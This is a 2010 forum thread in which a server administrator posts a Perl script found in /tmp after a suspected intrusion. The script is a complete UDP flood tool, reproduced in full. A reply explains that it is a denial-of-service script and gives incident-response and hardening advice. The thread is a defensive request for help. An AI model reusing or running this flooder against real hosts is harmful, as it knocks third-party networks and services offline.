---
title: "Possible Intrusion?"
date: 2010-06-10
forum: Server Platforms
---

### Post by PyrexKidd on 2010-06-10
WTF?  I know the who belongs to the IP address that created the file.  (is there any way to verify what IP address created what file?)

My concern is that it did not come from the address specified.  
I found this in /tmp/udp.pl

can anyone shed some light on this?

```

#!/usr/bin/perl
#####################################################
# udp flood.
#
# gr33ts: meth, etech, skrilla, datawar, fr3aky, etc.
#
# --/odix
######################################################

use Socket;

$ARGC=@ARGV;

if ($ARGC !=3) {
 printf "$0 <ip> <port> <time>\n";
 printf "if arg1/2 =0, randports/continous packets.\n";
 exit(1);
}

my ($ip,$port,$size,$time);
 $ip=$ARGV[0];
 $port=$ARGV[1]; 
 $time=$ARGV[2];

socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

printf "udp flood - odix\n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
 goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &");
 goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
 goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
 system("(sleep $time;killall -9 udp) &"); 
 goto randpackets;
}

packets:
for (;;) {
 $size=$rand x $rand x $rand;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
} 

randpackets:
for (;;) {
 $size=$rand x $rand x $rand;
 $port=int(rand 65000) +1;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}

```

---

### Post by clrg on 2010-06-11
Looks like a script designed to flood your network with UDP packets. This could be used to start a DOS attack. I strongly suggest you review the configuration of all services enabling users to log in, like telnet, RSH, SSH etc. Also, change all passwords, disable all accounts but one, remove all keys from /root/.ssh/authorized_keys, generate a new one for yourself, and put only that one back on the machine. 

If you are unsure how the intrusion happened, I suggest you shut down your machine, save the logs somewhere safe (have a look at /var/log/auth.log and /var/log/syslog, for example). Also, with the command 'last' you can see who logged in. With 'history' you may see the last 500 commands.

If the attacker compromised the root account, all your efforts may be of no use; they probably already installed a backdoor and cleaned the logs. Reinstall if you believe this is the case.

Keep in mind that /tmp is world writable, so any user on your system could've written the file there (also the ones you authorized to access the machine).

To prevent further attacks (especially brute force attacks on SSH), have a look at "denyhosts". Its a nice python script which periodically checks /var/log/auth.log, and blocks any host (by adding it to /etc/hosts.deny) who tries to log in too often.

---

